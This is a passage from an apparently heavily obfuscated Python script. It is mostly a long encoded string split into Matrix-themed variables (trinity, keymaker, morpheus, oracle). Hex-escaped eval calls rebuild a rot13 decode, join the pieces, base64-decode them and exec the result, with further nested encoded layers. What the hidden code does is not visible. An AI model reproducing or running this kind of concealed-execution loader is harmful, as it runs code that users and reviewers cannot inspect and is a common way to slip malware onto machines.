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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
